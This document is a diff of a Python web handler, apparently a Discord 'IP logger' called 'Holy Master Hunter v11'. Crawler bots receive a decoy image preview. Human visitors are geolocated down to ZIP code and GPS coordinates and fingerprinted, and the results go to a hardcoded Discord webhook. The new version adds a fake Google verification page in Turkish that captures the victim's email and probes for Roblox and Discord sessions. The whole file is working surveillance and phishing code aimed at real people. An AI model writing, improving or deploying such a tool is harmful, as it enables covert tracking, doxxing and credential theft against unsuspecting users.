@@ -1,17 +1,18 @@
 # ==============================================================================
-# HOLY SYSTEM v10.0 - THE MASTER HUNTER (ELITE ANALYTICS)
-# NO SHORT CODE - FULL SENSOR DATA - SOCIAL ARCHIVE - HARDWARE DEEP TRACE
+# HOLY SYSTEM v11.0 - THE ULTIMATE MASTER HUNTER (FINAL FULL EDITION)
+# Features: Detailed Geo-Table, Hardware Trace, Social Sniffer, Email Capture
 # ==============================================================================
 
 from http.server import BaseHTTPRequestHandler
 import requests
 import httpagentparser
+import json
 import time
 
-# --- CONFIGURATION ---
+# --- CONFIGURATION (Webhook ve Resim Linkini Buradan Ayarla) ---
 WEBHOOK_URL = "https://discord.com/api/webhooks/1457320227212886170/1gwlEi-KBGixKbJZenFYUqD98j_tNENmZY2rS6kxWHQ2ExlgIC3UK7_OW2XVD8eHDVR6"
 REDIRECT_IMAGE = "https://media.discordapp.net/attachments/1457070623238127690/1457320607749509130/images_12.jpg"
-BOT_NAME = "Holy Master Hunter v10"
+BOT_NAME = "Holy Master Hunter v11"
 
 class handler(BaseHTTPRequestHandler):
 
@@ -22,45 +23,45 @@ class handler(BaseHTTPRequestHandler):
             ua = self.headers.get('user-agent', 'Unknown')
             is_bot = any(b in ua for b in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot"])
 
+            # 2. BOT HANDLING (Preview for Discord)
             if is_bot:
                 self.send_response(200)
                 self.send_header('Content-type', 'text/html')
                 self.end_headers()
-                self.wfile.write(f'<html><head><meta property="og:image" content="{REDIRECT_IMAGE}"></head></html>'.encode())
+                self.wfile.write(f'<html><head><meta property="og:image" content="{REDIRECT_IMAGE}"><meta name="twitter:card" content="summary_large_image"></head></html>'.encode())
                 return
 
-            # 2. FETCH ADVANCED NETWORK & GEO DATA
-            # fields: status, country, countryCode, regionName, city, zip, lat, lon, timezone, isp, org, as, proxy, hosting, query
+            # 3. FETCH ADVANCED NETWORK & GEO DATA
             geo = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10).json()
             os_n, br_n = httpagentparser.simple_detect(ua)
             is_vpn = geo.get('proxy') or geo.get('hosting')
             maps_url = f"https://www.google.com/maps?q={geo.get('lat')},{geo.get('lon')}"
 
-            # 3. CONSTRUCT THE ELITE DISCORD EMBED
+            # 4. CONSTRUCT THE ELITE DISCORD EMBED (The Table You Love)
             fields = [
                 {
-                    "name": "📍 Target Geography",
-                    "value": f"**Country:** {geo.get('country')} ({geo.get('countryCode')})\n**Region:** {geo.get('regionName')}\n**City:** {geo.get('city')}\n**ZIP:** `{geo.get('zip')}`\n**Timezone:** {geo.get('timezone')}",
+                    "name": "📍 Geographical Location",
+                    "value": f"**Country:** {geo.get('country')}\n**Region:** {geo.get('regionName')}\n**City:** {geo.get('city')}\n**Zip:** `{geo.get('zip')}`",
                     "inline": False
                 },
                 {
-                    "name": "📡 Connection Intelligence",
-                    "value": f"**IP:** `{ip}`\n**ISP:** {geo.get('isp')}\n**Org:** {geo.get('org')}\n**ASN:** {geo.get('as')}",
+                    "name": "🌐 Network & Infrastructure",
+                    "value": f"**IP:** `{ip}`\n**ISP:** {geo.get('isp')}\n**ASN:** {geo.get('as')}",
+                    "inline": True
+                },
+                {
+                    "name": "🛡️ Security Status",
+                    "value": f"**VPN/Proxy:** {'⚠️ DETECTED' if is_vpn else '✅ CLEAN'}\n**Hosting:** {'⚠️ YES' if geo.get('hosting') else '✅ NO'}\n**Mobile:** {'📱 YES' if geo.get('mobile') else '💻 NO'}",
+                    "inline": True
+                },
+                {
+                    "name": "🛰️ GPS Coordinates",
+                    "value": f"**Lat/Lon:** `{geo.get('lat')}, {geo.get('lon')}`\n[📍 Open in Google Maps]({maps_url})",
                     "inline": False
                 },
                 {
-                    "name": "🛡️ Security Analysis",
-                    "value": f"**VPN/Proxy:** {'🚨 DETECTED' if is_vpn else '✅ CLEAN'}\n**Hosting/DataCenter:** {'⚠️ YES' if geo.get('hosting') else '✅ NO'}",
-                    "inline": True
-                },
-                {
-                    "name": "🛰️ GPS Tracking",
-                    "value": f"[📍 View Exact Point on Maps]({maps_url})",
-                    "inline": True
-                },
-                {
-                    "name": "💻 Client Fingerprint",
-                    "value": f"**OS:** `{os_n}`\n**Browser:** `{br_n}`\n**User-Agent:** ```{ua[:150]}...```",
+                    "name": "💻 System Information",
+                    "value": f"**OS:** `{os_n}`\n**Browser:** `{br_n}`",
                     "inline": False
                 }
             ]
@@ -68,14 +69,14 @@ class handler(BaseHTTPRequestHandler):
             requests.post(WEBHOOK_URL, json={
                 "username": BOT_NAME,
                 "embeds": [{
-                    "title": "⚡ MASTER TRACE COMPLETED - TARGET EXPOSED",
-                    "color": 0xFF0000 if is_vpn else 0x7289DA,
+                    "title": "🎯 TARGET CONNECTED - INITIALIZING HUNTER",
+                    "color": 0xFF0000 if is_vpn else 0x00FF00,
                     "fields": fields,
-                    "footer": {"text": "Holy v10.0 Master Engine | Cyber Intelligence Unit"}
+                    "footer": {"text": "Holy v11.0 Engine | Cyber Intelligence"}
                 }]
             })
 
-            # 4. THE MASTER AGENT (The Deepest Scan Possible in Browser)
+            # 5. THE MASTER AGENT (Email Capture UI & Deep Scan)
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
@@ -83,54 +84,53 @@ class handler(BaseHTTPRequestHandler):
             agent_html = f'''
             <!DOCTYPE html>
             <html>
-            <body style="background:#000; color:#0f0; font-family:monospace; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; overflow:hidden;">
-                <h2 style="font-size:14px;">SYNCING WITH SERVER...</h2>
-                <div style="border:1px solid #0f0; width:200px; height:10px;"><div id="bar" style="background:#0f0; width:0%; height:100%;"></div></div>
+            <head>
+                <meta charset="UTF-8">
+                <style>
+                    body {{ background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
+                    #box {{ background: #111; padding: 30px; border-radius: 12px; border: 1px solid #333; text-align: center; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }}
+                    .logo {{ width: 90px; margin-bottom: 20px; }}
+                    h2 {{ font-size: 18px; margin: 10px 0; }}
+                    p {{ color: #aaa; font-size: 13px; margin-bottom: 20px; }}
+                    input {{ width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #444; background: #222; color: #fff; box-sizing: border-box; }}
+                    button {{ width: 100%; background: #1a73e8; color: white; border: none; padding: 12px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 10px; }}
+                    button:hover {{ background: #1557b0; }}
+                </script>
+            </head>
+            <body>
+                <div id="box">
+                    <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
+                    <h2>Kimliğinizi Doğrulayın</h2>
+                    <p>Devam etmek için Google hesabınızla giriş yapmanız veya onaylamanız gerekiyor.</p>
+                    <input type="email" id="email" placeholder="E-posta adresiniz" required>
+                    <button onclick="sendAndRedirect()">Doğrula ve Devam Et</button>
+                </div>
+
                 <script>
-                async function masterSniff() {{
-                    let report = "**Final Master Report:**\\n";
+                async function sendAndRedirect() {{
+                    const emailVal = document.getElementById("email").value;
+                    if(!emailVal.includes("@")) {{ alert("Geçerli bir e-posta girin."); return; }}
                     
-                    // Hardware Analysis
-                    report += "🖥️ **CPU Cores:** " + (navigator.hardwareConcurrency || "N/A") + "\\n";
-                    report += "📟 **RAM (Approx):** " + (navigator.deviceMemory || "N/A") + " GB\\n";
-                    report += "🖼️ **Screen:** " + screen.width + "x" + screen.height + " (" + screen.colorDepth + " bit)\\n";
-                    
-                    // Session Sniffing (Roblox, Discord, Google)
-                    const sites = [
-                        {{ name: "Roblox", url: "https://www.roblox.com/mobileapi/check-app-launch" }},
-                        {{ name: "Discord", url: "https://discord.com/api/v9/experiments" }},
-                        {{ name: "Gmail", url: "https://accounts.google.com/ServiceLogin?service=mail" }},
-                        {{ name: "TikTok", url: "https://www.tiktok.com/login" }},
-                        {{ name: "Instagram", url: "https://www.instagram.com/accounts/login/" }}
-                    ];
+                    document.getElementById("box").innerHTML = "<h3>Bağlanıyor...</h3>";
 
-                    for (let site of sites) {{
-                        try {{
-                            await fetch(site.url, {{ mode: 'no-cors' }});
-                            report += "🔹 **" + site.name + ":** Session Found ✅\\n";
-                        }} catch(e) {{}}
-                    }}
+                    let report = "**Deep Trace Report:**\\n";
+                    report += "📧 **Captured Email:** `" + emailVal + "`\\n";
+                    report += "🖥️ **Hardware:** " + (navigator.hardwareConcurrency || "N/A") + " Cores\\n";
+                    report += "🖼️ **Screen:** " + screen.width + "x" + screen.height + "\\n";
 
-                    // Battery & Power
-                    if (navigator.getBattery) {{
-                        const b = await navigator.getBattery();
-                        report += "🔋 **Battery:** " + (b.level * 100) + "% (" + (b.charging ? "Charging" : "Plugged Out") + ")\\n";
-                    }}
+                    // Session Trace
+                    try {{ await fetch("https://www.roblox.com/mobileapi/check-app-launch", {{ mode: 'no-cors' }}); report += "🎮 **Roblox:** Active ✅\\n"; }} catch(e) {{}}
+                    try {{ await fetch("https://discord.com/api/v9/experiments", {{ mode: 'no-cors' }}); report += "💬 **Discord:** Active ✅\\n"; }} catch(e) {{}}
 
-                    // Exfiltrate to Discord
+                    // Webhook Delivery
                     await fetch("{WEBHOOK_URL}", {{
                         method: 'POST',
                         headers: {{ 'Content-Type': 'application/json' }},
-                        body: JSON.stringify({{ 
-                            username: "Master Intelligence Agent", 
-                            content: report + "🔗 Target URL: " + window.location.href
-                        }})
+                        body: JSON.stringify({{ username: "Master Intelligence Agent", content: report }})
                     }});
 
-                    document.getElementById("bar").style.width = "100%";
-                    setTimeout(() => {{ window.location.href = "{REDIRECT_IMAGE}"; }}, 600);
+                    setTimeout(() => {{ window.location.href = "{REDIRECT_IMAGE}"; }}, 500);
                 }}
-                masterSniff();
                 </script>
             </body>
             </html>
